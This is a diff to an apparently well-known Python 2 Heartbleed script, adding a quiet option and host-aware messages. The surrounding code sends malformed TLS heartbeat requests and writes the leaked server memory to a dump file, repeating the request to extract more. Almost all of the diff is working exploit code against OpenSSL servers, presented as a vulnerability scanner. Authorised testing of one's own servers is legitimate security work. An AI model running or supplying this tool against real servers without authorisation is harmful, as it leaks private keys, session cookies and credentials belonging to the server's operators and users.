@@ -17,6 +17,7 @@ options.add_option('-p', '--port', type='int', default=443, help='TCP port to te
 options.add_option('-n', '--num', type='int', default=1, help='Number of heartbeats to send if vulnerable (defines how much memory you get back) (default: 1)')
 options.add_option('-f', '--file', type='str', default='dump.bin', help='Filename to write dumped memory too (default: dump.bin)')
 options.add_option('-v', '--ver', type='int', default=2, help='TLS version 1 is 1.0, 2 is 1.1, 3 is 1.2, 0 will try all (default: 0)')
+options.add_option('-q', '--quiet', default=False, help='Do not display the memory dump', action='store_true')
 
 def h2bin(x):
 	return x.replace(' ', '').replace('\n', '').decode('hex')
@@ -54,10 +55,11 @@ hbv12 = h2bin('''
 01 40 00
 ''')
 
-def hexdump(s, dumpf):
+def hexdump(s, dumpf, quiet):
 	dump = open(dumpf,'a')
 	dump.write(s)
 	dump.close()
+	if quiet: return
 	for b in xrange(0, len(s), 16):
 		lin = [c for c in s[b : b + 16]]
 		hxdat = ' '.join('%02X' % ord(c) for c in lin)
@@ -97,37 +99,37 @@ def recvmsg(s):
 	print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
 	return typ, ver, pay
 
-def hit_hb(s, dumpf):
+def hit_hb(s, dumpf, host, quiet):
 	while True:
 		typ, ver, pay = recvmsg(s)
 		if typ is None:
-			print 'No heartbeat response received, server likely not vulnerable'
+			print 'No heartbeat response received from '+host+', server likely not vulnerable'
 			return False
 
 		if typ == 24:
-			print 'Received heartbeat response:'
-			hexdump(pay, dumpf)
+			if not quiet: print 'Received heartbeat response:'
+			hexdump(pay, dumpf, quiet)
 			if len(pay) > 3:
-				print 'WARNING: server returned more data than it should - server is vulnerable!'
+				print 'WARNING: server '+ host +' returned more data than it should - server is vulnerable!'
 			else:
-				print 'Server processed malformed heartbeat, but did not return any extra data.'
+				print 'Server '+host+' processed malformed heartbeat, but did not return any extra data.'
 			return True
 
 		if typ == 21:
-			print 'Received alert:'
-			hexdump(pay, dumpf)
-			print 'Server returned error, likely not vulnerable'
+			if not quiet: print 'Received alert:'
+			hexdump(pay, dumpf, quiet)
+			print 'Server '+ host +' returned error, likely not vulnerable'
 			return False
 
-def connect(host, port):
+def connect(host, port, quiet):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	print 'Connecting...'
+	if not quiet: print 'Connecting...'
 	sys.stdout.flush()
 	s.connect((host, port))
-	print 'Sending Client Hello...'
+	if not quiet: print 'Sending Client Hello...'
 	sys.stdout.flush()
 	s.send(hello)
-	print 'Waiting for Server Hello...'
+	if not quiet: print 'Waiting for Server Hello...'
 	sys.stdout.flush()
 	return s
 
@@ -141,22 +143,22 @@ def parseresp(s):
 		if typ == 22 and ord(pay[0]) == 0x0E:
 			return True
 
-def check(host, port, version, dumpf):
+def check(host, port, version, dumpf, quiet):
 	response = False
-	s = connect(host, port)	
+	s = connect(host, port, quiet)	
 	if not parseresp(s):
 		return
-	print 'Sending heartbeat request...'
+	if not quiet: print 'Sending heartbeat request...'
 	sys.stdout.flush()
 	if (version == 1):
 		s.send(hbv10)
-		response = hit_hb(s,dumpf)
+		response = hit_hb(s,dumpf, host, quiet)
 	if (version == 2):
 		s.send(hbv11)
-		response = hit_hb(s,dumpf)
+		response = hit_hb(s,dumpf, host, quiet)
 	if (version == 3):
 		s.send(hbv12)
-		response = hit_hb(s,dumpf)
+		response = hit_hb(s,dumpf, host, quiet)
 	s.close()
 	return response
 	
@@ -166,18 +168,19 @@ def main():
 		options.print_help()
 		return
 
+	print 'Scanning ' + args[0] + ' on port ' + str(opts.port)
 	for i in xrange(0,opts.num):
-		check(args[0], opts.port, opts.ver, opts.file)	
+		check(args[0], opts.port, opts.ver, opts.file, opts.quiet)	
 		if (opts.ver == 0):
 			one = 0
 			two = 0
 			three = 0
-			one = check(args[0], opts.port, 1, opts.file)
-			two = check(args[0], opts.port, 2, opts.file)
-			three = check(args[0], opts.port, 3, opts.file)
-			if one: print 'TLS v1.0 is Vulnerable'
-			if two: print 'TLS v1.1 is Vulnerable'
-			if three: print 'TLS v1.2 is Vulnerable'
+			one = check(args[0], opts.port, 1, opts.file, opts.quiet)
+			two = check(args[0], opts.port, 2, opts.file, opts.quiet)
+			three = check(args[0], opts.port, 3, opts.file, opts.quiet)
+			if one: print 'TLS v1.0 on '+ args[0] +' is Vulnerable'
+			if two: print 'TLS v1.1 on '+ args[0] +' is Vulnerable'
+			if three: print 'TLS v1.2 on '+ args[0] +' is Vulnerable'
 
 if __name__ == '__main__':
 	main()
